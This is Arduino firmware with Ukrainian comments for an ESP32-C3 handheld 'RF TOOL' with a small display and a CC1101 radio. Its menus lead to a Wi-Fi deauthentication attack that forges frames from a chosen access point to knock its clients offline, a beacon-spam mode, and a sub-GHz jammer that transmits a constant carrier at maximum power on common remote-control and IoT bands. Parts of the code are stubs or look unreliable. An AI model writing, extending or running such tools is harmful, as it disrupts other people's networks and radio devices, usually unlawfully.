#include <Arduino.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <ELECHOUSE_CC1101.h>
#include <EEPROM.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни ESP32-C3 ======================
// TFT ST7735
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8
#define TFT_BL      9

// CC1101 (SPI)
#define CC1101_CS   4   // для бібліотеки (не обов'язково, але для сумісності)

// Кнопки
#define BTN_UP      1
#define BTN_DOWN    2
#define BTN_SEL     3
#define BTN_BACK    0   // BOOT кнопка

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ====================== Меню ======================
enum MenuState {
  MAIN_MENU,
  WIFI_MENU,
  SUBGHZ_SCAN,
  SUBGHZ_JAM,
  SETTINGS,
  AP_SELECT
};
MenuState currentState = MAIN_MENU;
int menuIndex = 0;
int subIndex = 0;
bool isRunning = false;

// Для Wi-Fi
int apCount = 0;
int selectedAP = 0;
String apNames[20];
uint8_t apBSSID[20][6];
int apChannels[20];
bool beaconSpam = false;

// Для CC1101
float freqs[] = {315.0, 433.92, 868.0, 915.0};
int freqIndex = 0;

// Налаштування
int brightness = 150;
bool saveFlag = false;

// ====================== Прототипи ======================
void drawMainMenu();
void drawWiFiMenu();
void drawAPSelect();
void drawSubGHzScan();
void drawSubGHzJam();
void drawSettings();
void updateDisplay();
void checkButtons();
void scanWiFi();
void startDeauth(uint8_t* bssid, int channel);
void startBeaconSpam();
void stopWiFiAttack();
void saveSettings();
void loadSettings();

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  
  // Кнопки
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  
  // Підсвітка
  pinMode(TFT_BL, OUTPUT);
  analogWrite(TFT_BL, brightness);
  
  // Дисплей
  SPI.begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(1);
  tft.fillScreen(ST77XX_BLACK);
  
  // EEPROM (збереження)
  EEPROM.begin(64);
  loadSettings();
  
  // CC1101
  SPI.begin(8, 11, 10, 4);  // SCK, MISO, MOSI, CS
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setMHZ(freqs[freqIndex]);
  ELECHOUSE_cc1101.setTxPowerAmp(12);  // макс. потужність
  
  // Wi-Fi (для деаутера)
  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  drawMainMenu();
}

void loop() {
  checkButtons();
  
  // Активні процеси
  if (currentState == SUBGHZ_SCAN && isRunning) {
    static unsigned long lastScan = 0;
    if (millis() - lastScan > 200) {
      lastScan = millis();
      int rssi = ELECHOUSE_cc1101.getRssi();
      tft.fillRect(0, 40, 80, 30, ST77XX_BLACK);
      tft.setCursor(5, 50);
      tft.print("RSSI: ");
      tft.print(rssi);
      tft.print(" dBm");
    }
  }
  
  if (currentState == SUBGHZ_JAM && isRunning) {
    // Постійна несуча (в бібліотеці немає прямого методу, тому через регістри)
    static bool carrierOn = false;
    if (!carrierOn) {
      ELECHOUSE_cc1101.SetCarrierFreq(freqs[freqIndex]);
      carrierOn = true;
    }
  } else {
    ELECHOUSE_cc1101.SetIdle();
  }
  
  delay(20);
}

// ====================== Меню (малювання) ======================
void drawMainMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.println("RF TOOL v2.0");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  
  const char* items[] = {"Wi-Fi Tools", "Sub-GHz Scan", "Sub-GHz Jam", "Settings"};
  for (int i = 0; i < 4; i++) {
    int y = 30 + i * 20;
    if (i == menuIndex) {
      tft.setTextColor(ST77XX_YELLOW);
      tft.setCursor(5, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    tft.setCursor(15, y);
    tft.print(items[i]);
  }
  tft.setCursor(5, 150);
  tft.setTextColor(ST77XX_CYAN);
  tft.print("UP/DN SEL BACK");
}

void drawWiFiMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Wi-Fi Tools");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  
  const char* items[] = {"Scan APs", "Deauth Attack", "Beacon Spam"};
  for (int i = 0; i < 3; i++) {
    int y = 30 + i * 20;
    if (i == subIndex) {
      tft.setTextColor(ST77XX_YELLOW);
      tft.setCursor(5, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    tft.setCursor(15, y);
    tft.print(items[i]);
  }
}

void drawAPSelect() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Select Target");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  
  for (int i = 0; i < min(apCount, 4); i++) {
    int y = 30 + i * 20;
    if (i == selectedAP) {
      tft.setTextColor(ST77XX_YELLOW);
      tft.setCursor(5, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    tft.setCursor(15, y);
    tft.print(apNames[i].substring(0, 10));
  }
}

void drawSubGHzScan() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Sub-GHz Scan");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 1);
  tft.println(" MHz");
  if (isRunning) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(5, 55);
    tft.print("SCANNING...");
  } else {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(5, 55);
    tft.print("Press SEL start");
  }
}

void drawSubGHzJam() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Sub-GHz Jammer");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 1);
  tft.println(" MHz");
  if (isRunning) {
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(5, 55);
    tft.print("JAMMING!");
  } else {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(5, 55);
    tft.print("Press SEL start");
  }
}

void drawSettings() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Settings");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Brightness: ");
  tft.print(map(brightness, 0, 255, 0, 100));
  tft.print("%");
  tft.setCursor(5, 55);
  tft.print("Save: SEL");
}

// ====================== Кнопки ======================
void checkButtons() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 200) return;
  
  if (digitalRead(BTN_UP) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) menuIndex = (menuIndex + 3) % 4;
    else if (currentState == WIFI_MENU) subIndex = (subIndex + 2) % 3;
    else if (currentState == AP_SELECT) selectedAP = (selectedAP + apCount - 1) % apCount;
    else if (currentState == SUBGHZ_SCAN && !isRunning) freqIndex = (freqIndex + 3) % 4;
    else if (currentState == SUBGHZ_JAM && !isRunning) freqIndex = (freqIndex + 3) % 4;
    else if (currentState == SETTINGS) brightness = constrain(brightness - 25, 0, 255);
    updateDisplay();
  }
  
  if (digitalRead(BTN_DOWN) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) menuIndex = (menuIndex + 1) % 4;
    else if (currentState == WIFI_MENU) subIndex = (subIndex + 1) % 3;
    else if (currentState == AP_SELECT) selectedAP = (selectedAP + 1) % apCount;
    else if (currentState == SUBGHZ_SCAN && !isRunning) freqIndex = (freqIndex + 1) % 4;
    else if (currentState == SUBGHZ_JAM && !isRunning) freqIndex = (freqIndex + 1) % 4;
    else if (currentState == SETTINGS) brightness = constrain(brightness + 25, 0, 255);
    updateDisplay();
  }
  
  if (digitalRead(BTN_SEL) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) {
      switch (menuIndex) {
        case 0: currentState = WIFI_MENU; subIndex = 0; drawWiFiMenu(); break;
        case 1: currentState = SUBGHZ_SCAN; isRunning = false; drawSubGHzScan(); break;
        case 2: currentState = SUBGHZ_JAM; isRunning = false; drawSubGHzJam(); break;
        case 3: currentState = SETTINGS; drawSettings(); break;
      }
    }
    else if (currentState == WIFI_MENU) {
      if (subIndex == 0) { // Scan APs
        scanWiFi();
        currentState = AP_SELECT;
        selectedAP = 0;
        drawAPSelect();
      } else if (subIndex == 1) { // Deauth
        if (apCount > 0) startDeauth(apBSSID[selectedAP], apChannels[selectedAP]);
      } else if (subIndex == 2) { // Beacon Spam
        beaconSpam = !beaconSpam;
        if (beaconSpam) startBeaconSpam();
        else stopWiFiAttack();
        drawWiFiMenu();
      }
    }
    else if (currentState == AP_SELECT) {
      currentState = WIFI_MENU;
      drawWiFiMenu();
    }
    else if (currentState == SUBGHZ_SCAN) {
      isRunning = !isRunning;
      if (isRunning) {
        ELECHOUSE_cc1101.setMHZ(freqs[freqIndex]);
        ELECHOUSE_cc1101.RX_Mode();
      } else {
        ELECHOUSE_cc1101.SetIdle();
      }
      drawSubGHzScan();
    }
    else if (currentState == SUBGHZ_JAM) {
      isRunning = !isRunning;
      drawSubGHzJam();
    }
    else if (currentState == SETTINGS) {
      analogWrite(TFT_BL, brightness);
      saveFlag = true;
      drawSettings();
    }
  }
  
  if (digitalRead(BTN_BACK) == LOW) {
    lastPress = millis();
    if (currentState != MAIN_MENU) {
      currentState = MAIN_MENU;
      isRunning = false;
      beaconSpam = false;
      stopWiFiAttack();
      ELECHOUSE_cc1101.SetIdle();
      drawMainMenu();
    } else if (saveFlag) {
      saveSettings();
      saveFlag = false;
    }
  }
}

void updateDisplay() {
  switch (currentState) {
    case MAIN_MENU: drawMainMenu(); break;
    case WIFI_MENU: drawWiFiMenu(); break;
    case AP_SELECT: drawAPSelect(); break;
    case SUBGHZ_SCAN: drawSubGHzScan(); break;
    case SUBGHZ_JAM: drawSubGHzJam(); break;
    case SETTINGS: drawSettings(); break;
  }
}

// ====================== Wi-Fi функції ======================
void scanWiFi() {
  apCount = WiFi.scanNetworks();
  for (int i = 0; i < apCount && i < 20; i++) {
    apNames[i] = WiFi.SSID(i);
    apChannels[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
}

void startDeauth(uint8_t* bssid, int channel) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
    0x00, 0x00, // Sequence
    0x01, 0x00  // Reason
  };
  
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 100; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }
}

void startBeaconSpam() {
  // Спрощений beacon spam (можна розширити)
  uint8_t beaconPacket[32] = {0x80, 0x00, 0x00, 0x00};
  esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
}

void stopWiFiAttack() {
  beaconSpam = false;
}

// ====================== EEPROM ======================
void saveSettings() {
  EEPROM.write(0, brightness);
  EEPROM.write(1, freqIndex);
  EEPROM.commit();
}

void loadSettings() {
  brightness = EEPROM.read(0);
  if (brightness < 10 || brightness > 250) brightness = 150;
  freqIndex = EEPROM.read(1);
  if (freqIndex > 3) freqIndex = 1;
}